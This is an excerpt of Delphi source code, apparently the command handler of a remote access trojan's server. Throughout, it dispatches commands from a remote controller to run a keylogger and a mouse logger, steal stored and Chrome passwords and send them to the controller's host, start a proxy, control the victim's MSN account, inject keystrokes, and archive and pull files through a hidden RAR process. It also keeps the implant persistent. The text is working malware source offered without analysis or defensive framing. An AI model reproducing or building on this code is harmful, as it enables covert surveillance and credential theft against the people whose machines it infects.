  if copy(Recebido, 1, pos('|', Recebido) - 1) = STARTAUDIO then
  begin
  ...
  begin
    delete(recebido, 1, pos('|', recebido));
    unitChat.ServerName := Copy(recebido, 1, pos(DelimitadorComandos, recebido) - 1);
    delete(recebido, 1, pos(DelimitadorComandos, recebido) - 1);
    delete(recebido, 1, Length(DelimitadorComandos));
    unitChat.ClientName := Copy(recebido, 1, pos(DelimitadorComandos, recebido) - 1);;
    delete(recebido, 1, pos(DelimitadorComandos, recebido) - 1);
    delete(recebido, 1, Length(DelimitadorComandos));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = CHATSTOP then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = CHATTEXT then
  begin
    delete(recebido, 1, pos('|', recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = KEYLOGGERATIVAR then
  begin
    PostMessage(ServerObject.Handle, WM_ACTIVEKEY, 0, 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = KEYLOGGERDESATIVAR then
  begin
    PostMessage(ServerObject.Handle, WM_DEACTIVEKEY, 0, 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = KEYLOGGERBAIXAR then
  begin
{
    ...
    begin
      ...
      while pos(#13#10#13#10#13#10, TempStr1) > 0 do
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = KEYLOGGEREXCLUIR then
  begin
    SendMessage(KeyObject, WM_CLEARKEY, 0, 0);
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGEREXCLUIR + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = KEYLOGGERONLINESTART then
  begin
    OnlineKeylogger := True;
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERONLINESTART + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = KEYLOGGERONLINESTOP then
  begin
    OnlineKeylogger := False;
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERONLINESTOP + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSELOGGERSTART then
  begin
    delete(Recebido, 1, pos('|', recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSELOGGERSTOP then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSELOGGERSTARTSEND then
  begin
    NewEnviarMouse := TNewEnviarMouse.Create(MainIdTCPClient.Host, MainIdTCPClient.Port);
    NewEnviarMouse.Resume;
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSELOGGERDELETE then
  begin
    delete(Recebido, 1, pos('|', recebido));
    while pos(#13#10, recebido) > 0 do
    begin
      DeleteFileW(pWideChar(Copy(Recebido, 1, pos(#13#10, recebido) - 1)));
      delete(recebido, 1, pos(#13#10, Recebido) + 1);
    end;
  end else
  
  if copy(Recebido, 1, pos('|', Recebido) - 1) = GETPASSWORDS then
  begin
    Password := TPassword.Create(MainIdTCPClient.Host, MainIdTCPClient.Port);
    Password.Resume;
  end else

  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = CHROMEPASS then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = KEYSEARCH then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    Randomize;
    ...
    begin
      ...
      if pos(WideUpperCase(Recebido), WideUpperCase(TempStr)) > 0 then
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = GETSERVERSETTINGS then
  begin
    TempStr := '';
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = PROXYSTART then
  begin
    delete(Recebido, 1, pos('|', recebido));
    LittleInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = PROXYSTOP then
  begin
    SendMessage(ServerObject.Handle, WM_PROXYSTOP, 0, 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = GETMSNSTATUS then
  begin
    PostMessage(ServerObject.Handle, WM_GETMSNSTATUS, 0, 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = EXITMSN then
  begin
    PostMessage(ServerObject.Handle, WM_EXITMSN, 0, 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = SETMSNSTATUS then
  begin
    delete(Recebido, 1, pos('|', recebido));
    PostMessage(ServerObject.Handle, WM_SETMSNSTATUS, StrToInt(recebido), 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = MSNCONTACTLIST then
  begin
    PostMessage(ServerObject.Handle, WM_MSNCONTACTLIST, 0, 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = MSNADDCONTACT then
  begin
    delete(Recebido, 1, pos('|', recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MSNDELCONTACT then
  begin
    delete(Recebido, 1, pos('|', recebido));
    LittleInt := Length(Recebido) * 2;
    GetMem(p, LittleInt);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MSNBLOCKCONTACT then
  begin
    delete(Recebido, 1, pos('|', recebido));
    LittleInt := Length(Recebido) * 2;
    GetMem(p, LittleInt);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MSNUNBLOCKCONTACT then
  begin
    delete(Recebido, 1, pos('|', recebido));
    LittleInt := Length(Recebido) * 2;
    GetMem(p, LittleInt);
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = DESATIVAR then
  begin
    CreateMutexW(nil, False, ConfiguracoesServidor.MutexSair);
    sleep(5000); // tempo de intervalo do persist
    ExitProcess(0);
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = RESTARTSERVER then
  begin
    CreateMutexW(nil, False, ConfiguracoesServidor.MutexSair);
    sleep(5000); // tempo de intervalo do persist
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDOWNLOADFOLDER then
  begin
    delete(Recebido, 1, pos('|', recebido));
    TempStr := Recebido;
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDOWNLOADFOLDERADD then
  begin
    delete(Recebido, 1, pos('|', recebido));
  ...
  if Copy(Recebido, 1, pos('|', Recebido) - 1) = SENDKEYSWINDOW then
  begin
    delete(Recebido, 1, pos('|', recebido));
    TempInt := StrToInt(Copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMCOPYFILE then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMCOPYFOLDER then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    ...
    while pos('\', TempStr1) > 0 do Delete(TempStr1, 1, pos('\', TempStr1));
  ...
  if Copy(Recebido, 1, pos('|', Recebido) - 1) = WINDOWPREV then
  begin
    delete(Recebido, 1, pos('|', recebido));
    TempInt := StrToInt(Copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDOWNLOADALL then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = ENVIARLOGSKEY then
  begin
{
    if KeyObject > 0 then SendMessage(KeyObject, WM_GETLOGFILE, 0, 0) else
    begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMCHECKRAR then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMRARFILE then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos('|', Recebido) - 1) + '.rar';
    Delete(Recebido, 1, pos('|', Recebido));
    ...
    begin
      ExecAndWait(TempStr1, 'a "' + TempStr2 + '" "' + Copy(Recebido, 1, pos('|', Recebido) - 1) + '"', SW_HIDE);
      Delete(Recebido, 1, pos('|', Recebido));
    end;
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMUNRARFILE then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMGETRARFILE then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos('|', recebido) - 1);
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMUNZIPFILE then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos('|', Recebido) - 1);
    TempStr := TempStr + '\';
    ForceDirectories(pwChar(TempStr));
    TempStr := Copy(Recebido, 1, pos('|', Recebido) - 1); //Diretório...

    Delete(Recebido, 1, pos('|', Recebido));
    TempStr1 := Copy(Recebido, 1, pos('|', Recebido) - 1); //Arquivo...
